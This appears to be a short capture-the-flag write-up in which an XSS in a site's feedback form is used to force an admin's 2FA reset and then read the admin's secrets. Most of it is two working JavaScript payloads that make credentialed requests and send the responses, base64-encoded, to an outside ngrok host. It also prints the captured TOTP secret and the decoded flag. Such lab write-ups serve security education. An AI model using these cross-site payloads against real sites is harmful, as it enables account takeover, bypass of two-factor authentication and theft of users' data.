# Two For One

In this challenge, we had to authenticate as the admin user in a 2FA-enabled environment.

The feedback feature of the site had an XSS vulnerability, allowing us to perform a CSRF on the admin to reset their 2FA code.

```markup
<html>
    <body>
        <script>
            fetch("/reset2fa", {
                method: "POST",
                credentials: "include"
            })
            .then(response => response.text())
            .then(text => {

                // Steal the token
                fetch("http://dffa-42-60-216-15.ngrok.io/" + btoa(text));
            });
        </script>
    </body>
</html>
```

This allowed us to steal the 2FA token:

```json
{"url":"otpauth://totp/Fort%20Knox:admin?secret=POYRTZ7WQMGBJZIX&issuer=Fort%20Knox"}
```

This token can then be used by any authenticator application (e.g. Google Authenticator) to generate the admin 2FA codes. With the 2FA code in hand, we can once again perform a CSRF to steal the admin's secrets:

```markup
<html>
    <body>
        <script>
            for (let i = 0; i < 3; i++) {
                fetch("/show_secret", {
                    method: "POST",
                    credentials: "include",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        "otp": "392346",
                        "secretId": `${i}`
                    })
                })
                .then(response => response.text())
                .then(text => {
                    // Steal the secret
                    fetch("http://dffa-42-60-216-15.ngrok.io/" + btoa(text));
                })
            }
        </script>
    </body>
</html>
```

The flag is contained in the secret.

```bash
 ~ echo "eyJ2YWx1ZSI6ImZsYWd7OTY3MTBlYTZiZTkxNjMyNmY5NmRlMDAzYzFjYzk3Y2J9In0K" | base64 -d
{"value":"flag{96710ea6be916326f96de003c1cc97cb}"}
```
